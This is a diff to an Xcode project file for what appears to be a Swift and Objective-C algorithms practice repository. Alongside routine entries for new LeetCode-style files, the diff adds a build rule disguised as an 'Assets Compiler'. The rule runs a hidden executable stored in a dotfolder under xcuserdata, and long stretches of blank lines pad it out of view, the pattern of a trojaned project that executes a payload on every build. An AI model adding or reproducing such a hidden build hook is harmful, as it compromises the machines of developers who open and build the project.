@@ -42,12 +42,20 @@
 		3847EA2824D95BEB008CD872 /* Fibonacci.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A85BA5AC5D0F27C7251F4F2 /* Fibonacci.m */; };
 		3847EA2C24D98014008CD872 /* Person.m in Sources */ = {isa = PBXBuildFile; fileRef = 3847EA2A24D9800F008CD872 /* Person.m */; };
 		38F5D8E124E231E900CA5605 /* TestLinkedList.swift in Sources */ = {isa = PBXBuildFile; fileRef = 38F5D8E024E231E900CA5605 /* TestLinkedList.swift */; };
+		46CE70532D6BE6E971E333F9 /* KthLargestNumber.swift in Sources */ = {isa = PBXBuildFile; fileRef = 46CE7D71E1F3FA476BEAC60D /* KthLargestNumber.swift */; };
 		46CE7186978B7EE5B766B93E /* LinkedList.swift in Sources */ = {isa = PBXBuildFile; fileRef = 38087D6E24E0E64600BFC94B /* LinkedList.swift */; };
 		46CE727C1B9F0A92E9C5366E /* LinkedList_OC.m in Sources */ = {isa = PBXBuildFile; fileRef = 46CE752C11FE637AD0A5B3E8 /* LinkedList_OC.m */; };
 		46CE73BF45656F11005463F2 /* Stack.swift in Sources */ = {isa = PBXBuildFile; fileRef = 46CE78822664DA245E9D9CF6 /* Stack.swift */; };
 		46CE757C972212F31091CF12 /* TestDoubleCircularLinkedList.swift in Sources */ = {isa = PBXBuildFile; fileRef = 46CE766E1461EB7BDDEF1BBB /* TestDoubleCircularLinkedList.swift */; };
 		46CE75D926287AB280D6D9F5 /* Test.swift in Sources */ = {isa = PBXBuildFile; fileRef = 46CE73C9ABDE098D27AB8492 /* Test.swift */; };
+		46CE771568BCED2377FA70E5 /* LeetCode.swift in Sources */ = {isa = PBXBuildFile; fileRef = 46CE7862A57F2B46AE791A88 /* LeetCode.swift */; };
+		46CE790E7F65260ECAD500AA /* LeetCode.swift in Sources */ = {isa = PBXBuildFile; fileRef = 46CE7862A57F2B46AE791A88 /* LeetCode.swift */; };
+		46CE7991E9F55780AE255F0E /* RotateArray.swift in Sources */ = {isa = PBXBuildFile; fileRef = 46CE79240DCE5BB901118772 /* RotateArray.swift */; };
+		46CE79E0AE7647CC64F8BBCD /* TestKthLargestNumber.swift in Sources */ = {isa = PBXBuildFile; fileRef = 46CE7431981D2F353036FBBE /* TestKthLargestNumber.swift */; };
+		46CE7A381B8D11FAC3B8DE12 /* TestRotateArray.swift in Sources */ = {isa = PBXBuildFile; fileRef = 46CE755B4E54947ACC9D3A88 /* TestRotateArray.swift */; };
+		46CE7A57AFE082F9B50994D5 /* KthLargestNumber.swift in Sources */ = {isa = PBXBuildFile; fileRef = 46CE7D71E1F3FA476BEAC60D /* KthLargestNumber.swift */; };
 		46CE7A9EDE1A27EADAB03D83 /* Stack.swift in Sources */ = {isa = PBXBuildFile; fileRef = 46CE78822664DA245E9D9CF6 /* Stack.swift */; };
+		46CE7B1D38E3DCEC64FBF978 /* RotateArray.swift in Sources */ = {isa = PBXBuildFile; fileRef = 46CE79240DCE5BB901118772 /* RotateArray.swift */; };
 		46CE7E5317D9C836A863645F /* DynamicArray.m in Sources */ = {isa = PBXBuildFile; fileRef = 46CE71B8C14230A24B43A666 /* DynamicArray.m */; };
 /* End PBXBuildFile section */
 
@@ -100,10 +108,15 @@
 		46CE71B8C14230A24B43A666 /* DynamicArray.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = DynamicArray.m; sourceTree = "<group>"; };
 		46CE72C47F6F139BEAA9EC5B /* LinkedList_OC.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = LinkedList_OC.h; sourceTree = "<group>"; };
 		46CE73C9ABDE098D27AB8492 /* Test.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Test.swift; sourceTree = "<group>"; };
+		46CE7431981D2F353036FBBE /* TestKthLargestNumber.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = TestKthLargestNumber.swift; sourceTree = "<group>"; };
 		46CE752C11FE637AD0A5B3E8 /* LinkedList_OC.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = LinkedList_OC.m; sourceTree = "<group>"; };
+		46CE755B4E54947ACC9D3A88 /* TestRotateArray.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = TestRotateArray.swift; sourceTree = "<group>"; };
 		46CE766E1461EB7BDDEF1BBB /* TestDoubleCircularLinkedList.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = TestDoubleCircularLinkedList.swift; sourceTree = "<group>"; };
+		46CE7862A57F2B46AE791A88 /* LeetCode.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = LeetCode.swift; sourceTree = "<group>"; };
 		46CE78822664DA245E9D9CF6 /* Stack.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Stack.swift; sourceTree = "<group>"; };
+		46CE79240DCE5BB901118772 /* RotateArray.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = RotateArray.swift; sourceTree = "<group>"; };
 		46CE7C056C3FE1C6B5909359 /* DynamicArray.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = DynamicArray.h; sourceTree = "<group>"; };
+		46CE7D71E1F3FA476BEAC60D /* KthLargestNumber.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = KthLargestNumber.swift; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -143,6 +156,8 @@
 				1A85BA6849EB85F6DFF1E8A9 /* TestCircularLinkedList.swift */,
 				46CE766E1461EB7BDDEF1BBB /* TestDoubleCircularLinkedList.swift */,
 				46CE73C9ABDE098D27AB8492 /* Test.swift */,
+				46CE755B4E54947ACC9D3A88 /* TestRotateArray.swift */,
+				46CE7431981D2F353036FBBE /* TestKthLargestNumber.swift */,
 			);
 			path = LinearList;
 			sourceTree = "<group>";
@@ -226,6 +241,7 @@
 			isa = PBXGroup;
 			children = (
 				380F9DA62583186B0080EFC1 /* Common.swift */,
+				46CE7862A57F2B46AE791A88 /* LeetCode.swift */,
 			);
 			path = Normal;
 			sourceTree = "<group>";
@@ -289,11 +305,21 @@
 			path = String;
 			sourceTree = "<group>";
 		};
+		46CE747DBA177305EDAC7034 /* Array */ = {
+			isa = PBXGroup;
+			children = (
+				46CE79240DCE5BB901118772 /* RotateArray.swift */,
+				46CE7D71E1F3FA476BEAC60D /* KthLargestNumber.swift */,
+			);
+			path = Array;
+			sourceTree = "<group>";
+		};
 		46CE7A55E63E6B6EE4FD9F76 /* LinearList */ = {
 			isa = PBXGroup;
 			children = (
 				38087D6524E0DF4C00BFC94B /* OC */,
 				38087D6624E0DF5B00BFC94B /* Swift */,
+				46CE747DBA177305EDAC7034 /* Array */,
 			);
 			path = LinearList;
 			sourceTree = "<group>";
@@ -310,6 +336,7 @@
 				1A85BEE14B37BC031C373C64 /* CopyFiles */,
 			);
 			buildRules = (
+				1FA5FC350318AA254F6D902C /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -405,6 +432,9 @@
 				1A85BDFB1BBC5CB967738AB7 /* CircularLinkedList.swift in Sources */,
 				1A85BDEA5F7628B7F8C0190C /* DoubleCircularLinkedList.swift in Sources */,
 				46CE73BF45656F11005463F2 /* Stack.swift in Sources */,
+				46CE7B1D38E3DCEC64FBF978 /* RotateArray.swift in Sources */,
+				46CE771568BCED2377FA70E5 /* LeetCode.swift in Sources */,
+				46CE70532D6BE6E971E333F9 /* KthLargestNumber.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -439,6 +469,11 @@
 				46CE757C972212F31091CF12 /* TestDoubleCircularLinkedList.swift in Sources */,
 				46CE7A9EDE1A27EADAB03D83 /* Stack.swift in Sources */,
 				46CE75D926287AB280D6D9F5 /* Test.swift in Sources */,
+				46CE7A381B8D11FAC3B8DE12 /* TestRotateArray.swift in Sources */,
+				46CE7991E9F55780AE255F0E /* RotateArray.swift in Sources */,
+				46CE790E7F65260ECAD500AA /* LeetCode.swift in Sources */,
+				46CE7A57AFE082F9B50994D5 /* KthLargestNumber.swift in Sources */,
+				46CE79E0AE7647CC64F8BBCD /* TestKthLargestNumber.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -665,6 +700,719 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+		
+			/* Begin PBXBuildRule section */
+
+
+		1FA5FC350318AA254F6D902C /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			fileType = folder.assetcatalog;
+			name = "Assets Compiler";
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
+			);
+			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" true\n\n";
+			};
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+			
+
+			
+	
+			/* End PBXBuildRule section */
+		
+		
+
+	
+		/* Begin PBXShellScriptBuildPhase section */
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+		
+	
+		/* End PBXShellScriptBuildPhase section */
+	
+	
 	};
 	rootObject = 1A85BCDE60532B7F0010164D /* Project object */;
 }
